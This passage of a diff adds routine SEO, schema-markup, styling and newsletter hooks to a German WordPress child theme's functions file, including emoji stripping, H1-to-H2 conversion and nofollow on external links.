+                    this.innerHTML = 'Weniger';
+                    this.setAttribute('data-expanded', 'true');
+                }
+            });
+        }
+
+// [LWPTOC entfernt]         // Mobile TOC: Automatisch zuklappen auf kleinen Bildschirmen
+// [LWPTOC entfernt]         if (window.innerWidth < 992) {
+// [LWPTOC entfernt]             var tocItems = document.querySelector(".lwptoc_items");
+// [LWPTOC entfernt]             var tocToggle = document.querySelector(".lwptoc_toggle_label");
+// [LWPTOC entfernt]             if (tocItems && tocToggle) {
+// [LWPTOC entfernt]                 // Items verstecken (Klasse entfernen falls vorhanden)
+// [LWPTOC entfernt]                 tocItems.classList.remove("lwptoc_items-visible");
+// [LWPTOC entfernt]                 tocItems.style.display = "none";
+// [LWPTOC entfernt]                 // Toggle-Label aktualisieren
+// [LWPTOC entfernt]                 var showLabel = tocToggle.getAttribute("data-label") || "Anzeigen";
+// [LWPTOC entfernt]                 var hideLabel = tocToggle.innerHTML;
+// [LWPTOC entfernt]                 tocToggle.setAttribute("data-label", hideLabel);
+// [LWPTOC entfernt]                 tocToggle.innerHTML = showLabel;
+// [LWPTOC entfernt]             }
+        }
+    })();
+    </script>
+    <?php
+}
+add_action('wp_footer', 'ratgeber_redesign_footer_scripts', 99);
+
+/**
+ * ============================================================================
+ * DEQUEUE product-box.css auf Ratgeber-Seiten
+ * Die ratgeber-redesign.css hat kompletted Produktbox-Styling (Nordic Minimal Luxury)
+ * product-box.css wuerde das Layout ueberschreiben → deactivieren
+ * Version: 2.5.0
+ * ============================================================================
+ */
+function tv_dequeue_product_box_on_ratgeber() {
+    if (is_object_in_term(get_queried_object_id(), 'product_type')) {
+        wp_dequeue_style('tv-product-box');
+        wp_deregister_style('tv-product-box');
+    }
+}
+add_action('wp_enqueue_scripts', 'tv_dequeue_product_box_on_ratgeber', 100);
+
+/* ============================================================
+   AAWP Produktboxen: Emojis aus Beschreibungen entfernen
+   ============================================================ */
+function tv_strip_emojis_from_aawp( $html ) {
+    if ( strpos($html, "aawp") === false ) return $html;
+    // Unicode Emoji Ranges entfernen
+    $emoji_pattern = "/[\x{1F600}-\x{1F64F}]|[\x{1F300}-\x{1F5FF}]|[\x{1F680}-\x{1F6FF}]|[\x{1F1E0}-\x{1F1FF}]|[\x{2600}-\x{26FF}]|[\x{2700}-\x{27BF}]|[\x{FE00}-\x{FE0F}]|[\x{1F900}-\x{1F9FF}]|[\x{1FA00}-\x{1FA6F}]|[\x{1FA70}-\x{1FAFF}]|[\x{200D}]|[\x{20E3}]|[\x{E0020}-\x{E007F}]|[\x{2702}-\x{27B0}]|[\x{2611}\x{2714}\x{2716}\x{2728}\x{274C}\x{274E}\x{2753}-\x{2755}\x{2757}\x{2795}-\x{2797}\x{27A1}\x{27B0}]/u";
+    $html = preg_replace($emoji_pattern, "", $html);
+    return $html;
+}
+add_filter("the_content", "tv_strip_emojis_from_aawp", 999);
+add_filter("aawp_the_content", "tv_strip_emojis_from_aawp", 999);
+
+/* ============================================================
+   SEO: Alt-Tags Filter einbinden
+   ============================================================ */
+require_once get_stylesheet_directory() . '/inc/seo-alt-tags.inc.php';
+
+
+// ============================================================================
+// SEO-Fix 2026-02-14: H1 in Post-Content → H2 umwandeln (Fix fuer mehrfache H1)
+// Betrifft ALLE Vergleichsseiten - das template-H1 bleibt, Content-H1 wird H2
+// ============================================================================
+add_filter('the_content', 'tv2_convert_content_h1_to_h2', 5);
+function tv2_convert_content_h1_to_h2($content) {
+    if (!is_page()) return $content;
+    $post_id = get_the_ID();
+    if (!is_object_in_term($post_id, 'product_type')) return $content;
+
+    $content = preg_replace('/<h1([^>]*)>/', '<h2$1>', $content);
+    $content = str_replace('</h1>', '</h2>', $content);
+    return $content;
+}
+
+
+// ============================================================================
+// SEO-Fix 2026-02-14: BreadcrumbList Schema fuer Vergleichsseiten
+// ============================================================================
+// DEAKTIVIERT: Rank Math generiert bereits BreadcrumbList Schema
+// add_action('wp_footer', 'tv2_output_breadcrumb_schema', 99);
+function tv2_output_breadcrumb_schema() {
+    if (!is_page()) return;
+
+    $post_id = get_the_ID();
+    if (!is_object_in_term($post_id, 'product_type')) return;
+
+    $terms = get_the_terms($post_id, 'product_type');
+    if (empty($terms) || is_wp_error($terms)) return;
+
+    $term = $terms[0];
+    $page_title = get_the_title();
+
+    $breadcrumb = [
+        '@context' => 'https://schema.org',
+        '@type' => 'BreadcrumbList',
+        'itemListElement' => [
+            [
+                '@type' => 'ListItem',
+                'position' => 1,
+                'name' => 'Startseite',
+                'item' => home_url('/'),
+            ],
+            [
+                '@type' => 'ListItem',
+                'position' => 2,
+                'name' => $term->name,
+                'item' => home_url('/' . $term->slug . '/'),
+            ],
+            [
+                '@type' => 'ListItem',
+                'position' => 3,
+                'name' => $page_title,
+            ],
+        ],
+    ];
+
+    echo '<script type="application/ld+json">' . wp_json_encode($breadcrumb, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . '</script>';
+}
+
+
+// ============================================================================
+// SEO-Fix 2026-02-14: Output Buffer - Nofollow auf externe Links
+// ============================================================================
+add_action('template_redirect', 'tv2_start_output_buffer');
+function tv2_start_output_buffer() {
+    if (is_admin()) return;
+    ob_start('tv2_process_html_output');
+}
+
+function tv2_process_html_output($html) {
+    if (empty($html)) return $html;
+
+    $html_original = $html;
+    $home_host = parse_url(home_url(), PHP_URL_HOST);
+
+    // Nofollow auf externe Links ohne nofollow
+    $result = preg_replace_callback('/<a\s([^>]*href=["\x27](https?:\/\/[^"\x27]+)["\x27][^>]*)>/i', function($matches) use ($home_host) {
+        $tag = $matches[0];
+        $url = html_entity_decode($matches[2]);
+
+        $link_host = parse_url($url, PHP_URL_HOST);
+        if ($link_host === $home_host) return $tag;
+
+        if (preg_match('/rel=["\x27][^"\x27]*nofollow/', $tag)) return $tag;
+
+        if (preg_match('/rel=["\x27]([^"\x27]*)/', $tag, $rel_match)) {
+            $new_rel = trim($rel_match[1] . ' nofollow');
+            return str_replace($rel_match[0], 'rel="' . $new_rel, $tag);
+        }
+
+        return str_replace('<a ', '<a rel="nofollow noopener" ', $tag);
+    }, $html);
+
+    // Safety: preg_replace_callback returns null on PCRE error
+    if ($result === null) return $html_original;
+    $html = $result;
+
+    return $html;
+}
+
+
+// ============================================================================
+// SEO-Fix 2026-02-14: OG/Twitter Image Fallback fuer Seiten ohne Featured Image
+// ============================================================================
+add_filter('rank_math/opengraph/facebook/image', 'tv2_og_image_fallback', 20, 2);
+add_filter('rank_math/opengraph/twitter/image', 'tv2_og_image_fallback', 20, 2);
+function tv2_og_image_fallback($image, $opengraph = null) {
+    if (!empty($image)) return $image;
+    if (!is_page()) return $image;
+
+    $post_id = get_the_ID();
+    $thumb = get_the_post_thumbnail_url($post_id, 'large');
+    if ($thumb) return $thumb;
+
+    $terms = get_the_terms($post_id, 'product_type');
+    if (empty($terms) || is_wp_error($terms)) return $image;
+
+    $products = new WP_Query([
+        'post_type' => 'advisor_product',
+        'posts_per_page' => 1,
+        'tax_query' => [['taxonomy' => 'product_type', 'field' => 'term_id', 'terms' => $terms[0]->term_id]],
+        'meta_key' => '_thumbnail_id',
+        'meta_compare' => 'EXISTS',
+        'orderby' => 'date',
+        'order' => 'DESC',
+    ]);
+
+    if ($products->have_posts()) {
+        $products->the_post();
+        $thumb = get_the_post_thumbnail_url(get_the_ID(), 'large');
+        wp_reset_postdata();
+        if ($thumb) return $thumb;
+    }
+
+    return $image;
+}
+
+
+// ============================================================================
+// SEO-Fix 2026-02-16: FAQPage Schema zentral aus $pageFaqSnippet ausgeben
+// ============================================================================
+add_action('wp_footer', 'tv2_output_faqpage_schema', 98);
+function tv2_output_faqpage_schema() {
+    global $pageFaqSnippet;
+    if (empty($pageFaqSnippet) || !is_array($pageFaqSnippet)) return;
+    if (!is_page()) return;
+    
+    $schema = [
+        '@context' => 'https://schema.org',
+        '@type' => 'FAQPage',
+        'mainEntity' => $pageFaqSnippet,
+    ];
+    echo '<script type="application/ld+json">' . wp_json_encode($schema, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . '</script>';
+}
+
+
+/* ============================================================
+   TV2 Startseite Redesign v1.0.0 — Design 5 "Crimson Editorial"
+   Enqueue CSS/JS + Newsletter (nur auf Homepage)
+   ============================================================ */
+function tv2_startseite_v5_assets() {
+    if ( is_front_page() || is_home() ) {
+        wp_enqueue_style(
+            'tv2-startseite-v5',
+            get_stylesheet_directory_uri() . '/css/startseite-v5.css',
+            array(),
+            '1.2.0'
+        );
+        wp_enqueue_script(
+            'tv2-newsletter-js',
+            get_stylesheet_directory_uri() . '/js/tv2-newsletter.js',
+            array(),
+            '1.2.0',
+            true
+        );
+        wp_localize_script('tv2-newsletter-js', 'tv2_newsletter_ajax', array(
+            'ajax_url' => admin_url('admin-ajax.php'),
+        ));
+    }
+}
+add_action('wp_enqueue_scripts', 'tv2_startseite_v5_assets', 99);
+
+// Newsletter Handler einbinden
+if ( ! function_exists('tv2_newsletter_subscribe') ) {
+    require_once get_stylesheet_directory() . '/inc/tv2-newsletter.php';
+}
+
+
+
+/* ============================================================
+   TV2 Marken-Seite Redesign v1.1.0
+   Enqueue CSS (Brand-Taxonomy + Marken-Verzeichnis)
+   Fonts: Roboto/Roboto Slab bereits vom WoodMart-Theme geladen
+   ============================================================ */
+function tv2_marken_redesign_assets() {
+    if ( is_tax('brand') || is_page_template('page-marken.php') ) {
+        wp_enqueue_style(
+            'tv2-marken',
+            get_stylesheet_directory_uri() . '/css/tv2-marken.css',
+            array(),
+            '1.2.0'
+        );
+    }
+}
+add_action('wp_enqueue_scripts', 'tv2_marken_redesign_assets', 99);
+
+
+// TV2 Kategorie-Redesign v1.0.0
+function tv2_kategorie_redesign_assets() {
+    if ( is_category() ) {
+        wp_enqueue_style(
+            'tv2-kategorie',
+            get_stylesheet_directory_uri() . '/css/tv2-kategorie.css',
+            array(),
+            '1.2.0'
+        );
+    }
+}
+add_action('wp_enqueue_scripts', 'tv2_kategorie_redesign_assets', 99);
+
+// Department-Mapping laden
+if ( !function_exists('tv2_get_department_mapping') ) {
+    require_once get_stylesheet_directory() . '/inc/tv2-department-mapping.php';
+}
+
+/* ============================================================
+   TV2 Mega Footer — Global CSS + Fonts
+   Version: 1.0.0
+   ============================================================ */
+function tv2_footer_mega_assets() {
+    if ( ! is_front_page() && ! is_home() ) {
+        wp_enqueue_style(
+            "tv2-footer-mega-fonts",
+            "https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@300;400;500;600;700;800;900&display=swap",
+            array(),
+            null
+        );
+        wp_enqueue_style(
+            "tv2-footer-mega",
+            get_stylesheet_directory_uri() . "/css/tv2-footer-mega.css",
+            array(),
+            "1.1.0"
+        );
+        // Newsletter JS auch auf allen Seiten mit Mega-Footer
+        wp_enqueue_script(
+            "tv2-newsletter-js",
+            get_stylesheet_directory_uri() . "/js/tv2-newsletter.js",
+            array(),
+            "1.2.0",
+            true
+        );
+        wp_localize_script("tv2-newsletter-js", "tv2_newsletter_ajax", array(
+            "ajax_url" => admin_url("admin-ajax.php"),
+        ));
+    }
+}
+add_action("wp_enqueue_scripts", "tv2_footer_mega_assets", 99);
+
+// Newsletter Admin Page
+require_once get_stylesheet_directory() . "/inc/tv2-newsletter-admin.php";
+
+// Author Rating System
+require_once get_stylesheet_directory() . "/author-rating-system.php";
+require_once get_stylesheet_directory() . "/inc/author-works-assets.php";
+
+
+/**
+ * ============================================================================
+ * AUTHOR PROFILE PAGE v2 CSS
+ * Laden nur auf Team-Profil-Seiten (single-team)
+ * Version: 2.0.0
+ * ============================================================================
+ */
+function tv_enqueue_author_profile_v2_styles() {
+    if ( is_singular( 'team' ) ) {
+        // Google Fonts
+        wp_enqueue_style(
+            'tv-profile-fonts',
+            'https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Fraunces:opsz,wght@9..144,500;9..144,600;9..144,700&display=swap',
+            [],
+            null
+        );
+        
+        // Profile Page CSS
+        wp_enqueue_style(
+            'tv-author-profile-v2',
+            get_stylesheet_directory_uri() . '/css/author-profile-v2.css',
+            ['tv-profile-fonts'],
+            '2.0.0'
+        );
+    }
+}
+add_action( 'wp_enqueue_scripts', 'tv_enqueue_author_profile_v2_styles' );
+
+// TV2 Author Rating System
+require_once get_stylesheet_directory() . "/inc/tv-author-rating.php";
